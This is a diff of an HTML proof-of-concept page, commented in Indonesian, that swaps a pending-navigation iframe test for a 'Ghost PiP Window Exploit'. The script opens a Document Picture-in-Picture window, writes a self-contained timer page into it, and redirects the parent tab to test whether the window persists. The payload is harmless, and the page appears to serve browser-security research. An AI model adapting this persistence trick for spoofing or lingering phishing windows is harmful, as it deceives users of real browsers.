@@ -3,29 +3,123 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Pending Navigation Hang</title>
+<title>Ghost PiP Window</title>
 <style>
-  body { font-family: sans-serif; padding: 40px; text-align: center; }
-  iframe { width: 100%; height: 500px; border: 1px solid #ccc; margin-top: 20px; }
-  .note { color: #666; font-size: 14px; margin-top: 20px; }
+  body { font-family: sans-serif; padding: 40px; text-align: center; background: #f4f4f4; }
+  .btn { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #4285f4; color: #fff; border: none; border-radius: 8px; }
+  .btn:hover { background: #1557b0; }
+  #status { margin-top: 20px; font-family: monospace; font-size: 14px; color: #333; }
 </style>
 </head>
 <body>
 
-<h2>Pending Navigation / Slow Loading Hang Test</h2>
-<p>Iframe di bawah mencoba memuat <code>https://www.google.com:8443</code> (port tertutup).</p>
-
-<!-- Iframe ke port tertutup -->
-<iframe id="targetFrame" src="https://www.google.com:8443"></iframe>
-
-<div class="note">
-  Saat iframe menggantung (pending), address bar mungkin menampilkan <code>google.com:8443</code>.
-  Konten iframe tidak akan pernah dimuat karena port tertutup. Ini adalah dasar untuk serangan injeksi konten.
-</div>
+<h2>👻 Ghost PiP Window Exploit</h2>
+<p>Klik tombol di bawah untuk membuat jendela PiP yang tetap hidup meskipun halaman ini di-redirect.</p>
+<button id="startBtn" class="btn">Activate Ghost Window</button>
+<div id="status">[*] Ready...</div>
 
 <script>
-  // Tidak ada injeksi konten di sini, hanya mendemonstrasikan pending navigation.
-  // Untuk injeksi, kita perlu akses ke dokumen iframe (tidak mungkin karena cross-origin).
+(function () {
+  'use strict';
+
+  var btn = document.getElementById('startBtn');
+  var statusEl = document.getElementById('status');
+
+  function log(msg) {
+    statusEl.textContent = msg;
+    console.log("[Ghost PiP] " + msg);
+  }
+
+  async function createGhostPiP() {
+    try {
+      if (!('documentPictureInPicture' in window)) {
+        log('Document Picture-in-Picture not supported.');
+        return;
+      }
+
+      // ============================================
+      // 1. BUKA PiP
+      // ============================================
+      const pipWindow = await window.documentPictureInPicture.requestWindow({
+        width: 400,
+        height: 300
+      });
+
+      log('PiP Window Opened. Injecting persistent payload...');
+
+      // ============================================
+      // 2. TULIS ULANG DOKUMEN PiP (MANDIRI)
+      // ============================================
+      // Kita menulis ulang seluruh dokumen PiP agar tidak bergantung pada parent.
+      pipWindow.document.open();
+      pipWindow.document.write(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <meta charset="UTF-8">
+          <title>Ghost Window</title>
+          <style>
+            body {
+              font-family: sans-serif;
+              padding: 20px;
+              text-align: center;
+              background: #fff;
+              color: #333;
+              margin: 0;
+              height: 100vh;
+              display: flex;
+              flex-direction: column;
+              justify-content: center;
+              align-items: center;
+            }
+            h3 { color: #4285f4; margin-bottom: 10px; }
+            p { font-size: 13px; color: #666; margin-bottom: 15px; }
+            #time { font-family: monospace; font-size: 18px; color: #f00; }
+            .note { font-size: 11px; color: #999; margin-top: 20px; }
+          </style>
+        </head>
+        <body>
+          <h3>👻 Ghost Window Active</h3>
+          <p>This PiP window is independent from the parent tab.</p>
+          <div id="time">00:00:00</div>
+          <div class="note">Close this window manually to stop.</div>
+
+          <script>
+            (function() {
+              // Loop mandiri di dalam PiP (tidak bergantung pada parent)
+              var startTime = Date.now();
+              setInterval(function() {
+                var elapsed = Math.floor((Date.now() - startTime) / 1000);
+                var h = String(Math.floor(elapsed / 3600)).padStart(2, '0');
+                var m = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
+                var s = String(elapsed % 60).padStart(2, '0');
+                document.getElementById('time').textContent = h + ':' + m + ':' + s;
+              }, 1000);
+            })();
+          <\/script>
+        </body>
+        </html>
+      `);
+      pipWindow.document.close();
+
+      log('Persistent payload injected into PiP.');
+
+      // ============================================
+      // 3. REDIRECT HALAMAN UTAMA (UJI PERSISTENSI)
+      // ============================================
+      setTimeout(function() {
+        log('Redirecting parent tab to Google...');
+        window.location.replace('https://www.google.com');
+      }, 2000);
+
+    } catch (e) {
+      log('Error: ' + e.message);
+    }
+  }
+
+  btn.addEventListener('click', createGhostPiP, { once: true });
+
+})();
 </script>
 
 </body>
